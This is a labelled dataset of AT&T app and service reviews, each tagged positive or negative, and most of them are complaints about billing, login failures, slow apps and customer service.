"Two days ago I tried to put on an international plan on my phone line. I spoke to three different workers and waited for over an hour. Each worker had me hang up and dial a different number and they kept telling me I was calling the wrong department. They finally sent me back to the initial number I called. I had to spend over an hour on this simple task. Today I go to pay my phone bill and I keep getting errors. This is the worst service I ever had from AT&T, what is going on with your service???!!",negative

Excelente app,positive
There needs to be either update or something with this app,negative
"We have been good customers with AT&T for many years. I am appalled at the way you treat good customers. You give nothing for purchasing phones or IPad yet if I had been a new customer no telling what free things We would have gotten.  We had to pay almost 300 dollars upfront and then you charge a fee for upgrading our phones. You might want to consider giving your existing customers perks for just sticking with you.  Or, we can pay everything off, take our phones and IPad and go somewhere else!  From what I gather we can even keep our existing numbers.  Rebecca and William Coker",negative
Great,positive
The bill is ALWAYS incorrect.,negative
I always have more trouble logging onto my account than any other app. They need to simplify the login so I don’t get a message that I used the username for their cable service and not their phone service.,negative
"I have never had a worse experience with any company in all my over 50 years as an adult. I can’t get any resolution after talking to over 20 of your representatives. They are all nice, but afterwards, they either don’t give correct information or the next bill, it’s not what I was told it would be. This all started with a supposed expert who came to our home after being called by your service person who came to change our modem. The “expert’s” name was John Ross Thomas. We can’t get on the internet right here at home without waiting Forever, and it’s worse when we aren’t home. The phone jumps all over the place when on internet. I was told my bill was now on one account, would be $134 something for cell service and internet, and would be drafted on the 2nd of the month. I have a screen shot of that information on my phone from July 3rd at 11:22 AM from online chat with your agent. Today I look at my account, and it says I have 2 accounts, and my bill is $162 something. Oh and ours phones just Freeze up and won’t do anything for a period of time! I have pages of notes of dates, times, customer agent names, and information I was given. Today it appears, it is meaningless. Will you respond to any of this? NO!

Too many billing issues since AT&T took over Total was $88.21 now it shows $118. 81.,negative

"No changes to my service.. yet my bill each month goes up! Spoke to the retention department because of that, att gave me a $25 reduction on my bill... Didn’t happen. Instead it went up $15. So
I waited one more cycle and yup it went up again.",negative
If my bill is going to change you should put it in big red letters so people can know and not have it be a surprise. All the sudden the bill goes from 113 to 150 and it’s my fault I didn’t know because I didn’t read well into the app? Do better to inform customers.,negative
Way too many steps and obstacles to gain access to my account.,negative
"This ATT App is worthless now. It’s suppose to manage my account, such as managing employees usage,  controlling my daughters phone, getting notified when I need to make a bill payment hasn’t worked in 2 months.

"The billing that just ended , I was not over on this. I was afraid y’all would pull this on me. I’d check it one day and it would say 48.7 then 51 then 48 then 48.7. It went up and down. I will not pay the $25. If you draw it from my bank, I’ll go to another company.  I have done business with you for years and for the last year, service has been a nightmare",negative

Can’t get past the code verification page to verify it’s really me. Submit button freezes and it times out before it resets. How am I supposed to get in the app if it won’t let me verify myself?,negative
This app is a shame.. never works except in circles that lead nowhere,negative
Transferred 6times no one had a clue couldn’t understand or hear half the people.,negative
So we have had Att for a long long time. We decided to say good by to DTV and go with DTV NOW. Then not every a year they changed the billing amount and charge me from $42 to $69.99. Saying I changed my att account. Which WE DIDNT. I called to check. Then I decided to upgrade our account to get Att Watch Now and it doesn’t freaking work. This app doesn’t let me sign in to anything other then just my cell bill. Talk about a pain in the Butt!!!!!! I’m about over it and about to drop everything but our cell service!,negative
Hello I been with T-Mobile for more for a couple of years now,positive
"Not happy with the unannounced price raise for “fees and service charges”.
Then call to figure it all out and come to find out, your company raised my bill to pay for higher internet that I did not need not ask for.
 I’ve been a loyal customer for years and never paid late. And I constantly feel like every few months At@t raises something or makes it impossible to feel like your getting what your paying for.
It’s impossible to keep from thinking about switching providers when this happens repeatedly and especially when other providers are much cheaper.... 
Unhappy!",negative
"The app and the website are painfully slow. The way account data is accessed in the data base isn’t efficient.  The design is terrible.  It is difficult to find what you looking for and when you do, your account times out again and again. Poor design and architecture all the way around.",negative
"Other than showing basic usage, this app is difficult to navigate and lacks the functionality to make it useful.",negative
"This TV service is the worst service I have ever experienced! The service went up over fifty dollars! And then to top things off almost a year ago I called and wanted all purchases to be blocked on the tv, well lo and behold another tv purchases on my account for a movie I never ordered! I hate DTV and let your pushy sales people talk me into a great deal that wasn’t ever a great service for TV or for customer appreciation! And really every time I call the person on the other end is barely speaking clear English! So I never know if the problem was solved until days later when I look at my account. As soon as I get back home from my vacation DTV WILL BE GONE!!!",negative
Awful,negative
"I used to be able to go into the app and just enter my security passcode. Now I have to enter my password AND my passcode.

ATT has severely gone down hill and more and more every month I consider switching carriers",negative
So the my AT&T app updated and now it won’t let me sign in so I can pay my bill. Can’t sign in at all!!! I put in my info and a message comes back saying “ login timed out “ every time. Fix this issue!!!,negative
Correction... absolutely awful,negative
Slow response and confusing billing,negative
"***Update months later and this app stinks. Best part is when I click on app support, the page won’t load. That is why I leave a review again. Hire someone who can keep this app working so I can go on to pay my bill. I love that when I went to the app it said it fixed a bug of a frozen home screen. Funny, mine is still frozen...and updated. Why does this app work only half the time????

DirecTv forced me to switch to this app and it has not gone past the spinning circle of death since first login. They asked me to take a survey yesterday and when I hit “submit” at the end, I received a 404 message. Feeling delighted I switched my cell to Verizon a few years ago because AT&T is not proficient at tech.",negative
Cannot sign in today so therefore you get 1 Star,negative
"Slow, unresponsive links. Feels like browsing the internet in 2001",negative
This app gets one star it crashes at least twice any time I try to use it to pay my bill.,negative
"despite having the Face ID enabled for sign in. It then tells you to confirm password... but goes to the account details page and there is no way to do what the pop up tells you to do without signing out completely. 

Also very poor at updating account information at sign in, or to get things to load.",negative
Poorly designed.,negative
"I can’t make an online payment?!? 
Any reason for this? I do it every month",negative
Enable Touch ID? Sure but still have to enter password AGAIN if the app launches at all. And get someone on the phone to deal rather than app or online? Sherlock Holmes couldn’t find their number. No wonder their logo is the Death Star.,negative
Literally links are dead and I'm asked to put in my password several times. It looks like it's loading at several times only to really be the spinning wheel if death. Shocking for an Enterprise if AT&T's size and caliber.,negative
Website and app are always having technical problems!,negative

"Not happy with the service at all... for the past two days, I have no service",negative
"What a trash app, I can’t login because it wants secondary authentication via sending a code through SMS. The problem is when the page loads to send the code it has to send code buttons and a cancel button. None of them work. I tried logging out and logging back in I tried deleting the app and reinstalling. I have been trying for two days now. Guess I’ll just use the web browser.",negative
Every single time I’ve tried to go onto the app I put in my login and password and it tells me I can’t go there that it’s restricted,negative

Already John fixed me up w the Emails..

I can’t login because 2FA shows buttons that are unresponsive when requesting code.,negative
Thanks for turning off our internet the day a new billing with a big $77.15 balance. At our first opportunity we will be as far away from AT&T as possible...kind of sad coming from a 30+year customer. Way to go,negative
Words cannot describe the lack of content that this app contains. I have to continually reset the password and then I’m locked out. I’m switching to another carrier,negative

Going on app because I have no cell service. I’m using wireless.  Can’t sign in because your security code is sent to phone number and I have no cell service.  Why not have the option of sending security codes via email????,negative
Irritating app asking to make a review all the time. Very difficult to navigate.,negative
I love the app.  I like how I can schedules payments easily.,positive
"I changed from boost and I don’t like it, it’s so slow, never can pay online or by phone, I’m really disappointed",negative
Worst app ever! Never lets me log in,negative
"Huge disappointment. Not accommodating for what was their fault.  Mis-led to believe I had FirstNet Plan coverage and I do not. My network doesn’t work half the places I go. So if I ever had an emergency my 11 yr old son and I both wouldn’t be able to dial 911. All they cared about was me paying the installment fee of $1300. BOGO program I signed for thinking I’d have elite coverage having first responder plan. So if I leave and go back to Verizon I don’t get the BOGO and would have to pay for both our phones. I even explained I don’t care if my bill was 8 cents a month, if my son can’t dial 911 it’s pointless in a non service area, where my husband seems to get service but we don’t. I told them I’d turn both phones in they are in brand new condition always in an Otterbox and my sons is in a Lifeproof case. Kept saying I signed an agreement. So I said what about your agreement saying I’d get FirstNet obligations. NO EXPLANATION!!",negative
Have not had cell and text service for 11 days. Still waiting on cell tower repair. Sooo disappointed in ATT.,negative
Worst app and service ever,negative
"I still don’t like your new website, takes too long  and confusing, not practical",negative
I used to login within seconds and now I spend hours and never am able to access my account and/or information!!!  Is of NO HELP and I don’t understand when you enter all your information you still can’t retrieve what you want...unhappy customer of 15 years +,negative
"It is an endless loop and does not ever allow me to see my account. I assume the app was updated and has not worked at all for me except when an ATT chat person manipulates it. I had zero issues in the past. I am wondering if the app wants me to use my thumb print to function to access the account. I do not want to use that feature. 
I am deleting the app and will do something else. This is ridiculous.",negative
This app is not saving my sign in info. I have spoke with a customer service rep and it is still not working properly. This is really frustrating.,negative
"This is the worse app! I can only see my wireless bill and when I called customer service and spent almost 30 minutes explaining I could only see the wireless bill, but could not see my internet bill the agent could not assist me either. Only explained it might be a system glitch!
Unbelievable!",negative
Absolutely the worst email system,negative
AT&T and direct tv are a scam do not ever get at&t the internet has not worked in months yet I can’t get out of my contract the app takes forever to make a simple decision,negative
Too complicated,negative
Error message to make payment and I keep submitting like it asks with no change. Also upset that 24 and 47 are removed from the channels and I watch them A LOT! Looking to switch companies now.,negative
"When preparing to pay my bill I did a chat concerning the increase along with not being able to get my favorite station.
The people I spoke to were very helpful in reviewing my bill to change some things to cut some cost plus enhance some functions. Other than currently not having some stations plus losing service whenever it rains hard or storms I have been very pleased with ATT employees, service and product.",positive
I have been on the phone talking to different sales people since 9:00 PM AT&T cut my line off because my husband passed away on May 1 now att cancel my phone after i paid them 200.00 if I had of known they were going to cut my phone off I wouldn’t of paid them anything now I have no phone thanks a lot AT&T,negative

"I agree whole heartedly with the review regarding using his credit card information from years ago that is sopposidly encrypted"" end to end and we cannot see any of your information at  all"" if you guys REALLY think we'd believe that, then your own representatives wouldn't tell you there's a workaround for not putting in any private information. You have to be brainless if you honestly think that in this age our identity hasn't been stolen and used a hundred times over by now and there's probably copies pick f birth certificates and social security cards credit cards everything. Anything can and HAS gotten Hacked into no matter what you want to call it and I definitely do believe they the supplier of the phones limit bad reviews and DEFINITELY BRICK YOUR PHONE. This whole advertised"" end to end encryption privacy policy is almost unbelievable. I'd love to have some sit down in front of me eye to eye & go over just "" how seriously they take our privacy. And everything is so safe download it to the cloud or iTunes or both "" ( just to be sure you know) Thanks for the thought- but I will forever be grateful to the person who invented the sticks. I would rather pay the 50$ + to download my phone information 2xs a month and pictures and messages, videos, phone numbers and files. At least I could actually FIND what I had spent 3 hours looking through an iPhone that's so organized that your life just screams for you to go have fun! Have one on us! You probably need it by the 2nd chat you have had with us! 
NOPE- After 4 generations working at At& T when it started out before Ma Bell,we all started from the ground and retired from a desk or life of travel while giving presentation on whatever each of us were involved with. This will be the last generation to work for a company that was VERY different than they are now. It's sad to watch what your grandmother worked so hard at thru her life that she devoted to AT&T. I believe she would cry if she knew the drive is not the customer service anymore. It's money . So they pair with makers who spend millions on advertising. I cannot wait to hear all the explanation about this iPhone 8 that was gotten from a "" stock"" Apple center and wasn't even what I ordered and it even came with a fin about WHY I can't get what I ordered. Daddy was AT&Ts legal people. One of the big guys that you will never be able to talk to as they are too busy with cases of identity theft, fraud, service department security information. I WANT to see the person who will be attending the hearing regarding my phone. And why negative reviews make you erasealmost everything but 6 lines. Really- people aren't that dumb to believe that something doesn't have any problem at all. That would make me wonder what are you hiding. But that's me. Now let's get to that meeting one of you""LL set up in Waterford to get this phone replaced with what I ordered and paid for and hopefully it will actually work. I DO NOT WANT a refurbished one thank you as this one has gone through at least the hands of 3 different people and not in just this country. Thanks again and we'll talk soon I'm sure.",negative
Every time I log in I get peace of mind very easy to use and quick loading thanks at&t,positive
"Bad UI/UX. limited and buggy functionality. Bad customer service. You’d expect much more from a company worth billions. It doesn’t take much money to make a good mobile app guys, seriously",negative
Taking forever to login,negative
"I hate that I can not go to one place and pay direct tv, Internet and phones.",negative
My bill went up $22 a month with no changes and no notice of increase! I’m about to change providers! It’s ridiculous how much I pay for cell service!,negative
I will be thrilled to find a service that allows me to pick what I want and not be locked into a contract! This is just so about pushing programs on people that they really don’t need. So not appreciated by most consumers. Corporations like AT&T must do better.,negative
"Bugs, crashes, not user friendly or intuitive. Pop up surveys get in the way.",negative
Y’all are OVERCHARGING ME FOR HBO WHICH I NEVER WANTED NOR ORDERED!!!! Quit charging me and refund all money since the very beginning! There are other TV options available to me and I may have no choice except to cancel you and change carriers!,negative
My voicemail has not worked since I bought this phone.  Even after the store rep. Set it up. I do not get reception in my office with this phone service but my work phone (Verizon) does.,negative
"So annoying to navigate. I have 5 different usernames from all of my other services showed up on here home internet, home phone, U-Verse, and all I wanted this app for is to use separately for my cell phone activities. They automatically added all of my other ATT accounts on here. Now I don't even know which bill I am looking at. I would have to navigate around to find out what I'm looking at. ITS SO ANNOYONG!! I HAVE MY SYSTEM OF TRACKING ACCOUNTS AND YOU MESSED IT ALL UP. THE WORSE FU$&ING COMPANG EVER!!!! I just got rid of your home internet service. Cell phone service will be next. Until I get rid of them all!!!!",negative
Virtual Help doesn’t work. Asked for a person and still need help merging ATT app login and Direct TV app same login/PW,negative
Please get rid of that! I have three accounts I don’t want to link any of them one of them is a business account and can’t beat a ranked every time I try to pay it takes me to linking accounts and I can’t get out of it today. Either fix it or I’m going with another Internet and phone company.,negative
"All my information was correct, but this site said my payment did not go through. My question is why?",negative
Received notification saying data was nearly used so I tried to look at it and I see 3 week old data,negative
"One of the worst apps I have ever used. Interface is clumsy, information is not easy to find, and performance (speed) is poor.",negative
"Issues with latest Watch TV has impacted using AT&T app for paying bills. The Watch TV app is unavailable in My ATT for repairing issues with Watch TV. 
Customer support is like bankers hours. 
Not 24-7",negative
The most user unfriendly app I’ve ever seen,negative
Since downloading this app it has never worked and I have had it on my phone for 2 years. Update and fix the bugs already! I can’t make any payments or do anything on the app. The only thing this app is good for is to see when your payment is due and how much which it’s been the same since I’ve gotten the phone so it’s not useful at all.,negative
"Make sure they check and double check what you are signing up for and they get your order In correctly the first time 
After almost two weeks and hours on the phone and moving schedule around to accommodate multiple visits I still don’t have what I am supposed to have. I’ve  Yet to have internet installed and now the order has miraculously been cancelled Again. The only and I mean only good thing Is every technician that has been here, the two corporate reps that have also been here and the courteous customer reps have All been very friendly and understanding of the countless errors and dilemmas. If my area wasn’t extremely limited with service I would have told them to shove it where the sun doesn’t shine. Extremely unhappy customer at this time.",negative
"I agree with the other review. They are lacking in customer service- spend too much time on be phone trying to understand/explain simple things to people sign heavy accents I can barely understand. Transferred multiple times and disconnected as well. Spent over 1 hour of my time with no answer. I’m so over this company. I’ve been here 12 years, probably time for a change.",negative
"Identify yourself!  For number is do not tell me what account your looking to be paid for !!  Putting the subscriber through the “hoops”. Yet you don’t NAME the service.

Not “user friendly”!",negative
Hard not to like an app that strives to do what it is intended to do!,positive
Your customer service is tiring. Your tactic of giving confusing answers and delaying respond time to my phone calls into billing for clarification- - - long story short: you stink,negative
Charges are too high and they add charges to TV service without notification. Billing is confusing and you have long hold times when calling to request service changes or billing questions. Really disappointed with cost of TV and am looking at other options.,negative
I have had this service for more than 10 years. The customer service had been great up until the last year. I have called them 4 times in the last week and they have promised to get back with me and not one of them have done so. The worst thing you can do to a customer is lie.  I will be canceling this service.,negative
Poor service at home and internet doesn’t work when my address is SUPPOSED to have the best internet connection in my area.,negative
Takes forever to load. Links within app don’t work. Not really useable...,negative
I canceled my insurance in May which took my monthly payments down....now this month I get a bill for 9$ more then last month.whats with that ? I have been with at@t for many years but I do believe it’s time to look for a different company !,negative
Despite many attempts to get current usage information the app brings up data from weeks ago with no current stats on usage or payments made via the website. Frustrating. Aggravating and disturbing that I’ve paid for service from AT&T.,negative
Internet is 1999 slow and AT&T app works one out of 10 time I try to use it. Glad I will be getting rid of their internet and Direct tv next month so I won’t have to mess with this app.,negative
I literally just set up service with at&t and they entered all of my information wrong into their system so now I don’t have account access and they are doing nothing to fix the situation. Terrible company. I should have listened to the laundry list of people who warned me about them.,negative
"Happy to re-record if something is done. 

On Verizon, I could use a personal hotspot. Here I can’t. I can’t just click and add a hotspot. I contact text support. Now that’s down. Apps malfunctioning. Thanks guys! The one time I had an issue. Everyone’s graded on their worst day right? Props to you for suggesting this day to request a review. Shows balls.",negative
Awful,negative
"Love the AT&T app. It’s easy to navigate, and has all your account info. You can login, pay your bill, and log out fast. Nice!",positive
I’ve been with At&t for more than 5 years and right now I’m about to pay 900 dollars for one month how ridiculous could this be!!! It’s insane I’m just going to change companies,negative
The payment was very easy. I think this version is better than the previous system.,positive
Tells me too try back in a few minutes. Been telling me that for days. Seems like they don't want my money. Worst customer service ever.,negative
If My account is going to be auto drafted then it would be helpful to see a calendar that shows what dates it will draft.,negative
Consistently unable to log in. Phantom 2-factor authentication (reset password via text then proof of ID required at same # proving exactly nothing). Customer service experiences growing and never satisfying.,negative
I have tried to get a bill sent to my home for almost a year now.   I have been in the AT&T store 4 times trying to get a bill sent to my home without luck.   I keep getting text messages that my bill is late.   I have given the same information 4 times.  What do I have to do????   I keep getting told at my visits that a bill will be sent to my house...  I have not seen a bill yet.  I’ve had this account almost a year.... Year in September....  I am really starting to get a little perturbed ??   So I will again go and try to get a bill sent to my house.   I don’t like paying on line...,negative
Payment constantly forces you to log back in even after you’ve saved passwords and enabled Face ID. Plus you cannot watch/stream when not on your home network. Access to your channels and DVR should be usable anywhere. We pay so much for the service - you should be available to give service to your customer anywhere they are!!,negative
Top level service,positive
"I absolutely To date hate AT&T,
I have been a very long time customer,
My phone bill is absolutely too hi
Other competitors offer much cheaper plans with better services .
My phone bill is always around 370 a month with unlimited text and unlimited talk I also have an Internet plan on top of that at my house along with Direct TV altogether AT&T collects around 7 to 800 a month from me and that is by far too much and I will make changes shortly thank you",negative
"It doesn’t remember who you are
It wants a User ID, but ATT only gives your account an ATT Access ID and Member ID, so good luck with that.
The ATT app is just as good as ATT’s product quality which is nonexistent.
Google Fiber, when will you get here!!!",negative
"Can you guys please not combine the cable and phone bill together?! It’s so complicated trying to pay the phone bill when the cable bill is the most prominent thing on the screen, especially from a cellphone!",negative
WE’VE BEEN OVER CHARGED SINCE THE BEGINNING OF BEING PORTED OUT FROM VERIZON WITHOUT MY PERMISSION ALSO NEVER PAID MY OLD BILL FROM VERIZON AS TOLD AND NEVER RECEIVED MY VISA CARD AS PART OF NEW CUSTOMER AS PROMISED! EMPLOYEE TOOK MY PHONE WITHOUT MY PERMISSION AND DISAPPEARED. Horrible experience and no one ever compensated us for any of these lies. Should and don’t leave VERIZON,negative
The speed on the internet is very very bad i moved from spectrum to at&t to not deal with this and is worst with at&t,negative
"Worse app on my iPad and phone. Actually, my att internet service is so slow, the app and their website is pure misery to use.",negative
"I joined ATT on Friday July 5,2019. I downloaded the app the next day and I’ve had a white blank screen or I get the message error “it’s not you it’s us we don’t have any info for your account right now”. I uninstalled and then reinstalled and still the same no luck. Please fix soon.",negative
You speak with someone about your service and you get the bill and everything you talked about was all for nothing,negative
"I have been trying to check my bill for the last 20 minutes!! The app did not recognize my password, I reset it and now it gives me a blank screen! Very frustrating!!",negative
Tired of the difficulty to sign into my account to pay my bill monthly,negative
Your website and your service are incredibly bad!,negative
It is useless app . I am unable to login after I spent couple of hours with customer care . Don’t  spent money on this app .,negative
"Once you get past the few basic items nothing works. Links won’t load, it freezes and then crashes",negative
App doesn’t work won’t allow me to sign in. Just goes blank after I log in. It’s worthless,negative
I do not like this app.. it gives me ni information on upgrades or usage break down,negative
The apps security process is overly burdensome.,negative
I want to thank you for great quality and exceptional customer service. AT&T has been great to my family and understanding of”life happens “.,positive
"When viewing data usage widget on phone, it was off by 25%. I logged in to the app and it was also misreporting by the same 25%. It wasn’t until I viewed the details that I saw the data usage was actually higher.

I suspect AT&T wants it this way, which in my opinion is an unfair business practice. Let’s hope the judge agrees when they eventually get caught.

The second star is because having the app is a quick and easy way to view my phone and data information.",negative
I have been with AT&T for several years and as of last year I have more dropped calls then ever. I spend more time redialing then I do talking,negative
This app is constantly spinning or under maintenance...making my payments late!,negative
Very frustrating and long call to get some information about a long distance call placed on my daughters cell phone - probably at least 20 minutes and speaking to somebody internationally.  I would really like to speak only to people in the United States. The rep took forever to find my account & kept asking questions. It took me no time to find the information I was looking for & had to wait for him to pull it up In his end to discuss. I need better & quicker customer service!!!,negative
"When you log in, the home screen is still frozen. Can’t use. :-(",negative
"It seems as if every time I try to use the app, I have to re-enter my password. That wouldn’t be a problem except that it never recognizes it and I have to reset it. I know it is correct as it is saved in my keychain. I just had to reset it 5 minutes ago and it already won’t let me in with my new password.",negative
Bill breakdown,negative
I have never once had ANYONE EVER FOLLOW THRU WITH WHAT THEY SAY.  EVERY AT& T REPRESENTATIVE LIES TO YOU ON THE PHONE AND THEN AFTER YOU'VE CALLED OVER 5 TIMES AND WASTED OVER AN HOUR EACH CALL THEY STILL DO NOT DO WHAT THEY SAY THEY WILL DO.  THIS IS THE WORST COMPANY I’VE EVER HAD TO DEAL WITH.  I CAN’T WAIT TILL MY CONTRACT IS OVER AND I CAN CANCEL MY 3 PHONES!!!!!!!!,negative
The app just spins when you try to look up phone usage. Needs improvement,negative
Can not stand AT&T as a company. They have taken Directv a wonderful and dependable and reputable company and turned it into the horrible and greedy hungry company with no morals . All they care about is putting money in there pockets.  Instead of all other companies that allow to cancel at anytime and charge or credit the difference in between a billing cycle.  No they charge you the whole billing cycle no matter what .  They can’t make agreements with other channels because they want more money.  We don’t get credit for not having those channels they just say sorry they are in negotiations.  All done AT&at you have screwed with this loyal customer for the last time,negative
"App needs overhaul on security. 
Way too difficult to login",negative
I wish I had read all these reviews first. Customers seem to have the same issue with a very incompetent company. Mom was a a retired ATT employee and it was a good company once upon a time. It’s got to be a management problem and most likely a poor CEO. I can almost bet they have numerous law suites. They should close their doors and leave the business to more competent providers.,negative
"Please take these reviews seriously! I have discovered that the AT&T website is not compatible with the Microsoft edge browser, however it will work with Safari and Chrome. For everyone writing that the screen just keeps spinning this may be your problem. I only figured this out after a week of trying. However this is unacceptable... AT&T should work with every browser. In addition, the service in rural areas or even suburbs outside of major cities is laughable compared to Verizon. I cannot use my AT&T phone inside my office, however Verizon and T-Mobile customers have no problem getting a signal. AT&T is the second largest wireless network... it should not be having these kinds of problems!",negative
"I am not able to get the app to load my bill, I am not able to update my profile and I don’t like that every time I open the app there is a notification to upgrade my phone.",negative
Had both my wireless account & my Direct TV account on this app for months. I go to pay my Direct TV bill & the account is no longer on the system. I did not request to have it removed. Had to call the number on my billing statement and got transferred a few times till I was successfully put through to the correct system. What a pain just to pay my bill!!,negative
The app is awful.  The security hurdles are overly redundant and make the app unusable.,negative
"Each time a change is made to try & reduce monthly charges, it ends up being $6-$8 more.",negative
Your app has become complete trash. It won’t even sign me in anymore and when I had it before I deleted it it never updated. It used to be good. I just redownloaded it and not it won’t even work. Fix this,negative
"Try to log into app & constantly have to change password. Called customer service number for assistance & spent too much time on phone. 
Once Direct TV & ATT combined services, services provided fell to less than 0! Never had any problems before...this is ridiculous!",negative
Terrible,negative
Take forever to update even simple changes. Also navigation to billing information is pretty counterintuitive. Not wowed by this app.,negative
I can access my account in the app but it will not show payment history or access payment options. I had to call customer service to make a payment,negative
App closes while using,negative
"I don’t know who authorizes things in this company but I am not pleased at all that I have been put on the pay my bills online. All of a sudden I’m not getting any paper bills in the mail which I won’t.
I’ve worked for this company for 39 years and this is how they treat me. 

Don mason",negative
"How is it that I have the ATT app but only see my Directv bill on that app?  It doesn’t even state what bill you think you are paying!!! How messed up is that?  You don’t care what hoops you have imposed on the customer to go through to pay their bill!!!! I am about done with Att AND Directv because of this mass confusion. And the employees you have when you call are absolute idiots!  In this day, this should be seamless but you have made this more complicated than it has to be!  Not that you care, it’s quite obvious you don’t or you would have this fixed to some kind of simpler solution. I have been with Directv since it was born and with Att for over 30 years. I think it’s time for a change since you can’t get your processes simplified!  Very disgusted customer over your payment processes!",negative
Would be four stars but App has too many malfunctions.  Only accurate 30 percent of the time.,positive
"The wireless router cuts out, our hardwired internet speed is up and down and now you can’t carry NBC in our area.",negative
Too many levels of verification for something I’ve logged into for years totally over the top,negative
I am a returning customer. I was quoted when I returned a monthly bill of 120.00 after fees and surcharges for five lines. Instead my bill is over 400.00 dollars and each line is being charged. What is going on here?,negative
I keep running into a lot of areas that I’m not getting signal.  Even my house I barely get a bar.,negative
"To recover my original plan, I lost half month of my paid plan and also I have to paid $10.00 to restart my auto paid. 
I called the agent to recover my plan and she told me that she could do nothing, because I was all done in the APP. 
I lost $30.00 for understanding the mutual- line option.",negative
App works fascinating.,positive
"I use the app to pay a bill or submit an issue and I can’t because ATT says my WiFi is within my areas limits. I can’t get service at my house that provides a useful internet speed to service two laptops and my DirectTV.  

So why did ATT make an app that I can’t even pay my bill on or get service for in my service area?",negative
All promises broken and never kept. Following up takes hours on the phone. If Uber 0-1 stars,negative
"I am not pleased with your high prices, have been an AT&T customer for 25 years and there are no incentives to keep you as a customer but give preference and best prices to a brand new customer. With regards to phone insurance is a waste of money eventhough have not used the “service that I am paying off” still when you are in need you need to pay the so called “Deductible”. Again 25 years as a customer paying that “Insurance fee”’and can not even get a cracked screen replaced without having to pay your “deductible”. Pathetic!!",negative
Poor reception st my home location. One or two bars. Expensive for the poor service. Changed from US Cellular years ago with promise of more towers. Sad.,negative
Manager Ryan Thomas at the Gilbert store promised a $200 credit to my account.  I am still waiting for the credit.  I would like to hear from a manager or social media will hear more about this horrible experience. 480-262-9311,negative
Constantally have to change even though I change it constantly it is never rightfully,negative
Not very user friendly,negative
"Every time I try to sign in in it doesn't recognize my password. When you try to get another password, it is not possible to get it by Email, only by text message, useless if you live abroad and cannot receive AT&T messages on your US number.",negative
"I have had more TROUBLE w AT&T since February. No one ones what they’re doing. They tell you they’re helping you, but then the next month I have the SAME EXACT problem as the month before where I was ASSURED that my acct was fixed. I have no idea how you can stay in business with such horrible service",negative
This app has had nothing but problems. I have had multiple times I have not been able to sign into my account so I can pay my bill. Now with the new & improved update it wants me to reenter my banking information that it already has or sign into my checking account which with this app I don’t feel comfortable doing. Such a big company it’s sad that they can’t get this app together,negative
The app will freeze up and take forever to load.  I have never been able to submit a payment through it.,negative
"IM LOOKING FOR A NEW PHONE CARRIER THEY ARE NEVER ON THE SAME PAGE THERE IS ALWAYS AN EXCUSE WHEN YOU CALL THERE IS NO-ONE THAT CAN GIVE YOU A STRAIGHT ANSWER AND THEN THEY ACT LIKE ITS YOUR FAULT. I’m so tried of being treated like I’m stupid when I call them, plus the bill keeps going up. There has to be better customer service and they need more training so many people in my community have said the same thing. Look into how people are treated and everyone needs to be on the same page when dealing with issues",negative
Asked to see my bill and it took me back to the sign in screen after already signed in. Usage not available after multiple attempts at times.,negative
I can’t see my previous Billings?,negative
"Clunky to use and keeps changing to a screen I didn’t want to see, it’s annoying!",negative
"AT&T’s automates Chat assistant is sufficient for rudimentary inquiries but anything beyond that is beyond its capabilities. I have yet to get a useable reply and have always had to request a representative. 

It’s basically an annoying, useless step in the process of getting an answer to a question. 

Make it better or take us directly to a representative.",negative
"Spent an hour working with direct / AT&T instead of canceling all my services that I CAN NOT afford - a mgr and sales rep were able to put together a package I could afford, where my cable was basic / basic & some promotional deal gave me a free phone & dripped my bill by $5 per month - I was skeptical but they promised so I agreed - I get my bill and instead of going down $5 it went UP $50 - I guess we are back to canceling everything- why can’t you ppl stick to your own deals & at what point do you realize $200 is way to unaffordable for a phone",negative
This company is absolute junk. No respect for their customers. Money sucking pigs.,negative
"This app is useless, it never ever works!!!! I even called about it!!! I would give it a negative number if it a ONE!!!",negative
On the phone to your Philippines central support ( super annoying) for 47 minutes now I am on hold to customer loyalty group to address my bill for a credit which I HAVE Not RECEIVED  that has been all over the place for the past 7 months of over charges of $10-30 per month. NOT HAPPY that my bill is all over the place absolutely ridiculous the amount of time it takes to deal with this.,negative
Bad customer service experience,negative
"Very frustrated with the poor internet we have. Too slow to watch any streaming show, news clip on my browser, etc... Yet the AT&T customers across the lake have high speed internet. AT&T simply won’t spend the money to upgrade the equipment serving our side of the lake. They realize we have very few options, so have no sense of urgency to improve our service! Grade above customer service!! Apparently, this being a negative review, it won’t be shared. After trying MANY nicknames (required to share), everyone has “been taken”! Including a bunch of colors that no one would choose! It simply blocks negative reviews with a low rating or unwanted key words! Sad!!",negative
AT&T screws my bill up every month. Smh and I am looking for another phone provider,negative
Really happy,positive
"Was in a text conversation and trying to figure out why every year about this time my bill always increases drastically...After waiting for service provider to ask me to hold while
Looking into my previous bills I get nothing in response!",negative

Nothing but headaches with billing.
They changed our home from without telling us when I told them I wanted to keep my number.
Very dishonest company can’t wait for contract to be up",negative
Terrible! The update dropped all my info,negative
"Complete GARBAGE app. I love AT&T but your app is ??. Your finger print ID doesn’t ever work, and you can’t load anything quickly. I’ve seriously timed it, over 5 minutes to go to the payment option just to make a payment. And no it’s not my internet or phone, it’s your crappy app. FIX IT. Oh and PS: no one wants direct TV that bad so please for the love of god stop with all the ads!",negative
I recently signed up for At&t internet. I have had 3 service technicians out b4 a month came in. I’ve been on the phone time & time again. The last technician stated that the apartment owners are having a wiring problem & for that reason my service does nothing but buffer!! No apartment manager is going to replace the wiring because it surely is costly. I was told initially that I would have been locked into a contract but with all the calls they stated that they would allow me to cancel once I make that decision.. it’s just so senseless to go through the same process & think it’s actually going to be better..,negative
"Tired of the expensive directv service, and now that they no longer air KRON, Channel 4 (San Francisco), I’m done.  On hold now to cut the cord.",negative
Disgusting company that squeezes every penny out of your pocket.  $140 a month to use the telephone. Outrageous.,negative
Bills are always too high,negative
"I pay almost $300 something dollars a month for 3 lines and I can't even log onto my att account 
Tech service and chat services never Gave me how to retrieve my user and pass word 
I will def finish out my contract after almost 8 years with att and find another phone service",negative
They say unlimited but it’s not true once you hit the gigs your service slows down 80-90%,negative
We moved to Grass Valley CA and most places are only one bar of service if any,negative
Never works and so UN user friendly,negative
Seems like there’s a glitch to view s bill from multiple accounts.,negative
The buttons are not responding.,negative
Many times the app just spins when trying to check the amount of bandwidth a user has consumed,negative
I spent 1 hour and 25 min on the phone with three different people trying to figure out a new plan and my billing cycle .,negative
I attempted to discuss the increase of my monthly bill until I figured out the chat was not live,negative
Annoyed,negative
